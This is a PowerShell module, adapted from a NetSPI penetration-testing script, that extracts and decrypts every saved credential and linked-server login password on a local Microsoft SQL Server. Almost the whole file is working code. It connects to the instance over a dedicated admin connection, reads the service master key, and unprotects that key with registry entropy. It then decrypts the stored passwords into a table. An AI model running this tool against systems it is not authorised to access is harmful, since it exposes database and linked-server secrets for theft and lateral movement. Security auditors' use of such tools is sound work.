<#
Adapted from a script by NetSPI:
https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLAllCredentials.psm1
#>
#--------------------------#
function m_MSSQLPwdDecrypt
{	param
	(	[Byte[]]$iaPwdImage
	,	[Int32]$iPwdImageIVLen
	,	[System.Security.Cryptography.SymmetricAlgorithm]$iCSP
	,	[Byte[]]$iaCSPKey);
	
	try 
	{	
		# Decrypt a password.
		
		[Byte[]]$aIV = $iaPwdImage[0..($iPwdImageIVLen - 1)];
		[Int32]$CryptLen = $iaPwdImage.Count - $iPwdImageIVLen;
		[IO.MemoryStream]$StrIn `
		=	New-Object IO.MemoryStream($iaPwdImage, $iPwdImageIVLen, $CryptLen, $false)  `
				-Property @{Position=0};
		[IO.BinaryReader]$BROut = New-Object Security.Cryptography.CryptoStream($StrIn, $iCSP.CreateDecryptor($iaCSPKey, $aIV), 'Read') `
		|	% {New-Object IO.BinaryReader($_)};
		
		# Removing the weird padding (6 bytes in the front) and extracting binary data length from 7 and 8 bytes... 
		# Might cause problems but so far seems to work.. Tested on MS SQL 9sp4, 10.5sp3, 11sp1, 11sp2 - works well.
		
		[Void]$BROut.ReadBytes(6);
		[Int32]$DstLen = $BROut.ReadInt16();
		
		[Text.Encoding]::Unicode.GetString($BROut.ReadBytes($DstLen));
	} 
	catch 
	{	throw;
	}
	finally
	{	if ($null -ne $Local:BROut) {$BROut.Close()};
		if ($null -ne $Local:StrIn) {$StrIn.Close()};
	}
}
#--------------------------#
############################
function Get-MSSQLAllCredentials
(	[parameter(Mandatory=0)][String]$iSQLInstName = 'MSSQLSERVER'
,	[parameter(Mandatory=0)][switch]$fSQLx86)
{
<# 
.SYNOPSIS
  Extract and decrypt MSSQL credentials.
  Author: Antti Rantasaari 2014, NetSPI
  Reworked by: TEH3OP
  License: BSD 3-Clause
  
.DESCRIPTION
  Author of original script: Antti Rantasaari 2014, NetSPI
  
  Get-MSSQLAllCredentials extracts and decrypts all saved credentials that include server credential objects and the connection credentials for all linked servers that use SQL Server authentication on choisen local MSSQL instance.

.PARAMETER iSQLInstName
  SQL instance name, witout server name (word after '\' ).

.PARAMETER fSQLx86
  Set it on when you connect to x86 MSSQL service running on x64 operation system.

.OUTPUTS
  System.Data.DataRow
  
  Returns a datatable with rows described below:
    ps_srv 
      mssql instance name
      
    ps_credential_type 
      'C' - saved mssql credential; 
      'LL' - linked login credential.
      
    ps_credential_id
      for ps_credential_type = 'C'  it is sys.credentials.credential_id value;
      for ps_credential_type = 'LL' it is sys.linked_logins.server_id (also sys.servers.server_id) value.
      
    ps_credential_name
      for ps_credential_type = 'C'  it is sys.credentials.name value;
      for ps_credential_type = 'LL' it is sys.servers.name value.
      
    ps_credential_identity
      for ps_credential_type = 'C'  it is sys.credentials.credential_identity value;
      for ps_credential_type = 'LL' it is sys.linked_logins.remote_name value.
      
    ps_modify_date
      for ps_credential_type = 'C'  it is sys.credentials.modify_date value;
      for ps_credential_type = 'LL' it is sys.linked_logins.modify_date value.
      
    ps_pwd 
      decrypted password

.EXAMPLE
  C:\PS>.\Get-MSSQLAllCredentials
    
  ps_srv                 : MY-DB\SQL2012
  ps_credential_type     : LL
  ps_credential_id       : 20
  ps_credential_name     : DWH-MAIN
  ps_credential_identity : data_steward
  ps_modify_date         : 19.02.2015 11:55:57
  ps_pwd                 : !@#Sup3rS3cr3tP4$$w0rd!!$$

  ps_srv                 : MY-DB\SQL2012
  ps_credential_type     : C
  ps_credential_id       : 101
  ps_credential_name     : ##xp_cmdshell_proxy_account##
  ps_credential_identity : MYCOMPANY\ss_proxy
  ps_modify_date         : 02.08.2015 16:32:25
  ps_pwd                 : Passw0rd01!
  
.NOTES  
  For successful execution, the following configurations and privileges are needed:
  - DAC connectivity to MSSQL instances
  - Local administrator privileges (needed to access registry key)
  - Sysadmin privileges to MSSQL instances

.LINK
  http://www.netspi.com/blog/
  https://github.com/TEH30P
#>

try 
{	Add-Type -assembly System.Security;
	Add-Type -assembly System.Core;
	
  # Set local computername and get all SQL Server instances
  $ComputerName = $Env:computername
  $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
  
  if ($iSQLInstName -ne $null -and $iSQLInstName -ne "") {
      if ($SqlInstances -notcontains $iSQLInstName) {
        Write-Error "Instance '$iSQLInstName' was not found in locally installed SQL Server instances."
        return $null;
      } else {
        $SqlInstances = $SqlInstances | Where-Object { $_ -eq $iSQLInstName }
      }
  }

  foreach ($InstName in $SqlInstances) {
  
    # Start DAC connection to SQL Server
    # Default instance MSSQLSERVER -> instance name cannot be used in connection string
    if ($InstName -eq "MSSQLSERVER") {
      $SQLSrv = "$ComputerName\"
    }
    else {
      $SQLSrv = "$ComputerName\$InstName"
    }
	$SQLCnn = New-Object System.Data.SqlClient.SQLConnection("Server=ADMIN:$SQLSrv;Trusted_Connection=True");
	$SQLCnn.Open();

	# Query Service Master Key from the database - remove padding from the key
	# key_id 102 eq service master key, thumbprint 3 means encrypted with machinekey
	[String]$SqlCmd = '
		SELECT	substring(crypt_property, 9, len(crypt_property) - 8) 
		FROM	sys.key_encryptions 
		WHERE	
			key_id=102 
		and	(thumbprint=0x03 or thumbprint=0x0300000001)
	';

	$Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$SQLCnn);
	[Byte[]]$SvcKeyEnc=$Cmd.ExecuteScalar();

	# Get entropy from the registry - hopefully finds the right SQL server instance
	if ($fSQLx86)
	{	[String]$RegPath = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Microsoft SQL Server\Instance Names\sql\').$InstName;
		[byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy;	
	}
	else
	{	[String]$RegPath = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\').$InstName;
		[byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy;	
	}

	# Decrypt the service master key
	$SvcKeyClear = [System.Security.Cryptography.ProtectedData]::Unprotect($SvcKeyEnc, $Entropy, 'LocalMachine');

	# Choose the encryption algorithm based on the SMK length - 3DES for 2005, 2008; AES for 2012
	# Choose IV length based on the algorithm
	if (-not (($SvcKeyClear.Length -eq 16) -or ($SvcKeyClear.Length -eq 32)))
	{	throw New-Object System.Exception('Unknown key size')}
	
	if ($SvcKeyClear.Length -eq 16) 
	{	[System.Security.Cryptography.SymmetricAlgorithm]$CSP `
			= New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
		  [Byte]$CSPIVLen=8;
	} 
	elseif ($SvcKeyClear.Length -eq 32)
	{	[System.Security.Cryptography.SymmetricAlgorithm]$CSP `
			= New-Object System.Security.Cryptography.AESCryptoServiceProvider;
		  [Byte]$CSPIVLen=16;
	}
	
	#$CSP.Padding = 'None';
	
	# Query credentials information from the DB
	# Remove header from encrypted password bytes.
	[String]$SqlCmd = @'
		SELECT
			ps_credential_type = 'C'
		,	ps_credential_id = co.id 
		,	ps_credential_name = co.name
		,	ps_credential_identity = CONVERT([SYSNAME], ov1.value) 
		,	ps_modify_date = co.modified  
		,	ps_pwd_image = SUBSTRING(ov2.imageval, 5, 8000)
		FROM
			[master].sys.sysclsobjs co
		INNER JOIN 
			[master].sys.sysobjvalues ov1
		ON	ov1.valclass = 28
		AND	ov1.objid = co.id
		AND	ov1.subobjid = 0
		AND	ov1.valnum = 1
		INNER JOIN 
			[master].sys.sysobjvalues ov2
		ON	ov2.valclass = 28
		AND	ov2.objid = co.id
		AND	ov2.subobjid = 0
		AND	ov2.valnum = 2
		WHERE
			co.class = 57
		UNION ALL
		SELECT
			ps_credential_type = 'LL'
		,	ps_credential_id = srv.srvid
		,	ps_credential_name = CONVERT([SYSNAME], srv.srvname)
		,	ps_credential_identity = ls.name
		,	ps_modify_date = ls.modate
		,	ps_pwd_image = SUBSTRING(ls.pwdhash, 5, 8000)
		FROM
			[master].sys.syslnklgns ls
		INNER JOIN
			[master].sys.sysservers srv
		ON	ls.srvid = srv.srvid
		WHERE
			LEN(pwdhash) > 0;
'@;
	
	$Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd, $SQLCnn);
	$Tbl = New-Object System.Data.DataTable;
	$Tbl.Load($Cmd.ExecuteReader());

	# Making table that will store return data.
	
	$TblRet = New-Object 'System.Data.DataTable';
	$TblRet.Columns.Add('ps_srv',[String]).AllowDBNull = $true;

	$Tbl.Columns | ? {$_.ColumnName -ne 'ps_pwd_image'} `
	|	%{	$TblRet.Columns.Add($_.ColumnName, [Type]$_.DataType).AllowDBNull = $_.AllowDBNull}; 

	$TblRet.Columns.Add('ps_pwd',[String]).AllowDBNull = $true;

	# Go through each row in results
	foreach ($RowIt in $Tbl) 
	{	# decrypt the password
		[String]$pwd = m_MSSQLPwdDecrypt `
			-iaPwdImage $RowIt.ps_pwd_image `
			-iPwdImageIVLen $CSPIVLen `
			-iCSP $CSP `
			-iaCSPKey $SvcKeyClear;
				
		[Void]$TblRet.Rows.Add(
			$SQLSrv
		,	$RowIt.ps_credential_type
		,	$RowIt.ps_credential_id
		,	$RowIt.ps_credential_name
		,	$RowIt.ps_credential_identity
		,	$RowIt.ps_modify_date
		,	$pwd);
	}

	$SQLCnn.Close(); $SQLCnn = $null;

	return $TblRet;
    }
} 
catch 
{	throw}
finally 
{	if ($SQLCnn -ne $null) {$SQLCnn.Dispose()}}}

#--------------------------#
#Export-ModuleMember -Function Get-MSSQLAllCredentials -ErrorAction SilentlyContinue | Out-Null;